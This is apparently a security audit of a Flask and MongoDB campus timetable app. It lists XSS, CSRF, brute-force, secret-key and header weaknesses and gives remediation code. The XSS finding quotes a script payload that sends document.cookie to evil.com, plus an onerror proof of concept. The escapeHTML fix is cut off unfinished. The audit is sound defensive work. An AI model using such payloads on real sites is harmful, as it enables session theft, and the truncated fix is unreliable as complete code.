4. CRITICAL VULNERABILITIES FOUND
================================================================================

----------------------------------------------------------------------
VULN-001: Cross-Site Scripting (XSS) - HTML Injection
----------------------------------------------------------------------
Severity:    CRITICAL
Location:    templates/timetable.html
             - displayTimetableGrid() function
             - showMessage() function
             - loadBatches() dropdown population
             - loadDemoBatches() dropdown population
Description: All data from MongoDB (course names, teacher names, room
             codes, batch names) is inserted directly into the DOM via
             innerHTML without any sanitization or escaping.

Impact:      An attacker who can insert malicious data into MongoDB
             (e.g., a course name like <script>document.location=
             'https://evil.com/steal?c='+document.cookie</script>)
             can execute arbitrary JavaScript in every user's browser.
             This can steal JWT tokens, session data, or redirect
             users to phishing sites.

Proof of Concept:
  If a timetable entry has:
    course_name: "<img src=x onerror=alert(document.cookie)>"
  This will execute JavaScript when any user views that timetable.

Fix:         Add escapeHTML() function and apply to ALL dynamic content.
             See Section 7, FIX-001.

----------------------------------------------------------------------
VULN-002: No Rate Limiting on Login Endpoint
----------------------------------------------------------------------
Severity:    CRITICAL
Location:    app.py - /api/auth/token endpoint
Description: The login endpoint has no rate limiting. An attacker can
             attempt unlimited password guesses (brute force attack).

Impact:      Admin account can be compromised through automated
             password guessing. With no lockout or delay, an attacker
             can try thousands of passwords per minute.

Fix:         Add flask-limiter with strict limits on /api/auth/token.
             See Section 7, FIX-002.

----------------------------------------------------------------------
VULN-003: SECRET_KEY / JWT_SECRET Potentially Weak
----------------------------------------------------------------------
Severity:    CRITICAL
Location:    app.py, .env
Description: If SECRET_KEY or JWT_SECRET is hardcoded, short, or
             uses a default fallback value, JWT tokens can be forged
             by an attacker who guesses or brute-forces the key.

Impact:      Attacker can create valid JWT tokens without knowing the
             admin password, gaining full admin access.

Fix:         Generate cryptographically strong random keys.
             See Section 7, FIX-003.

----------------------------------------------------------------------
VULN-004: MongoDB Credentials Exposed in .env
----------------------------------------------------------------------
Severity:    CRITICAL
Location:    .env file
Description: MongoDB Atlas connection string contains username and
             password in plain text. If .env is committed to Git
             (no .gitignore), credentials are permanently exposed
             in the repository history.

Impact:      Anyone with access to the Git repository can read the
             MongoDB credentials and access/modify/delete all data.

Fix:         Add .gitignore immediately. Rotate MongoDB password.
             See Section 7, FIX-004.

----------------------------------------------------------------------
VULN-005: No CSRF Protection
----------------------------------------------------------------------
Severity:    CRITICAL
Location:    app.py - all POST/PUT/DELETE endpoints
Description: No CSRF tokens are generated or validated. An attacker
             can craft a malicious webpage that makes requests to
             the CUI Campus Bot API on behalf of a logged-in admin.

Impact:      If an admin visits a malicious site while logged in,
             the attacker can upload fake timetables, delete data,
             or modify user accounts.

Fix:         Add Flask-WTF CSRF protection or custom CSRF tokens.
             See Section 7, FIX-005.

5. MEDIUM VULNERABILITIES FOUND
================================================================================

----------------------------------------------------------------------
VULN-006: No Security Headers
----------------------------------------------------------------------
Severity:    MEDIUM
Location:    app.py
Description: No security-related HTTP headers are set:
             - No X-Content-Type-Options
             - No X-Frame-Options
             - No X-XSS-Protection
             - No Referrer-Policy
             - No Content-Security-Policy
             - No Strict-Transport-Security

Impact:      Browser security features are not activated. The app is
             vulnerable to clickjacking (iframe embedding), MIME type
             sniffing attacks, and content injection.

Fix:         Add @after_request handler with security headers.
             See Section 7, FIX-006.

----------------------------------------------------------------------
VULN-007: No Content Security Policy (CSP)
----------------------------------------------------------------------
Severity:    MEDIUM
Location:    templates/timetable.html (and all templates)
Description: No CSP meta tag or header restricts which scripts,
             styles, fonts, and connections are allowed.

Impact:      If XSS is exploited, there is no secondary defense to
             prevent the injected script from loading external
             resources or exfiltrating data.

Fix:         Add CSP via meta tag or flask-talisman.
             See Section 7, FIX-007.

----------------------------------------------------------------------
VULN-008: No Input Validation on Batch Code
----------------------------------------------------------------------
Severity:    MEDIUM
Location:    templates/timetable.html - loadBatchTimetableManual()
Description: User input from the batch text field is only trimmed
             but not validated against an expected pattern.

Impact:      Malformed or malicious batch strings are sent directly
             to the API. While encodeURIComponent prevents URL
             injection, the server should also validate input.

Fix:         Add regex validation for batch codes.
             See Section 7, FIX-008.

----------------------------------------------------------------------
VULN-009: No HTTPS Enforcement
----------------------------------------------------------------------
Severity:    MEDIUM
Location:    app.py
Description: The app runs on HTTP with no redirect to HTTPS.
             All data including JWT tokens and login credentials
             is transmitted in plain text.

Impact:      Man-in-the-middle (MITM) attacks can intercept admin
             passwords, JWT tokens, and all timetable data on any
             network (especially public WiFi on campus).

Fix:         Add flask-talisman for production HTTPS enforcement.
             See Section 7, FIX-009.

----------------------------------------------------------------------
VULN-010: No Password Complexity Requirements
----------------------------------------------------------------------
Severity:    MEDIUM
Location:    app.py - user registration/password change
Description: No minimum password length, complexity, or common
             password checks are enforced.

Impact:      Admins can set weak passwords like "123456" or "admin"
             which are trivially guessable.

Fix:         Add password validator function.
             See Section 7, FIX-010.

----------------------------------------------------------------------
VULN-011: JWT Token in localStorage (XSS-accessible)
----------------------------------------------------------------------
Severity:    MEDIUM
Location:    Frontend JavaScript (admin templates)
Description: JWT tokens are likely stored in localStorage which is
             accessible by any JavaScript on the page. Combined with
             XSS (VULN-001), this allows token theft.

Impact:      XSS attack can steal the admin JWT token and send it
             to an attacker-controlled server, granting full admin
             access.

Fix:         Use httpOnly cookies for token storage, or fix all XSS
             vulnerabilities first.
             See Section 7, FIX-011.

----------------------------------------------------------------------
VULN-012: No Timetable Page Authentication
----------------------------------------------------------------------
Severity:    MEDIUM
Location:    templates/timetable.html
Description: The timetable page and all /api/timetable/* GET endpoints
             have no authentication. Anyone can access timetable data.

Impact:      If timetable data is meant to be restricted, it is
             currently publicly accessible. Scraping is possible.

Note:        If timetable data is intentionally public, this is
             acceptable. Mark as "Won't Fix" if by design.

FIX-001: XSS Protection - escapeHTML() Function
----------------------------------------------------------------------
File: templates/timetable.html

ADD THIS CODE:

    // Security: Escape HTML to prevent XSS
    function escapeHTML(str) {
      if (!str) return '';
      return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')

FIX-005: CSRF Protection
----------------------------------------------------------------------
File: app.py

OPTION A - Custom CSRF for API:
    import secrets

    @app.route('/api/csrf-token', methods=['GET'])
    def get_csrf_token():
        token = secrets.token_hex(32)
        session['csrf_token'] = token
        return jsonify({'csrf_token': token})

    @app.before_request
    def check_csrf():
        if request.method in ['POST', 'PUT', 'DELETE']:
            if request.path.startswith('/api/') and request.path != '/api/auth/token':
                token = request.headers.get('X-CSRF-Token')
                if not token or token != session.get('csrf_token'):
                    return jsonify({'error': 'CSRF validation failed'}), 403

FIX-006: Security Headers
----------------------------------------------------------------------
File: app.py

ADD THIS FUNCTION:
    @app.after_request
    def add_security_headers(response):
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        response.headers['Permissions-Policy'] = 'camera=(), microphone=(), geolocation=()'

            response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'

        return response

FIX-010: Password Complexity Validator
----------------------------------------------------------------------
File: app.py

ADD FUNCTION:
    import re

    def validate_password_strength(password):
        """Enforce minimum password complexity."""
        errors = []
        if len(password) < 8:
            errors.append("Password must be at least 8 characters")
        if not re.search(r'[A-Z]', password):
            errors.append("Must contain at least one uppercase letter")
        if not re.search(r'[a-z]', password):
            errors.append("Must contain at least one lowercase letter")
        if not re.search(r'[0-9]', password):
            errors.append("Must contain at least one digit")
        if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
            errors.append("Must contain at least one special character")
        if errors:
            return False, "; ".join(errors)
        return True, "OK"

USE IN registration/password-change endpoints:
    valid, msg = validate_password_strength(new_password)
    if not valid:
        return jsonify({'error': msg}), 400

FIX-011: Secure Token Storage
----------------------------------------------------------------------
File: app.py (set httpOnly cookie instead of returning token in JSON)

OPTION A - httpOnly Cookie (RECOMMENDED):
    @app.route('/api/auth/token', methods=['POST'])
    def login():
        ...verify credentials...
        token = jwt.encode(...)
        response = jsonify({'success': True, 'message': 'Login successful'})
        response.set_cookie(
            'auth_token',
            token,
            httponly=True,
            secure=True,       # Only send over HTTPS
            samesite='Strict', # Prevent CSRF
            max_age=3600       # 1 hour
        )
        return response

    # Update @token_required to check cookie:
    def token_required(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            token = request.cookies.get('auth_token')
            if not token:
                token = request.headers.get('Authorization', '').replace('Bearer ', '')
            if not token:
                return jsonify({'error': 'Token required'}), 401
            try:
                data = jwt.decode(token, app.config['JWT_SECRET'], algorithms=['HS256'])
                current_user = data['username']
            except jwt.ExpiredSignatureError:
                return jsonify({'error': 'Token expired'}), 401
            except jwt.InvalidTokenError:
                return jsonify({'error': 'Invalid token'}), 401
            return f(current_user, *args, **kwargs)
        return decorated
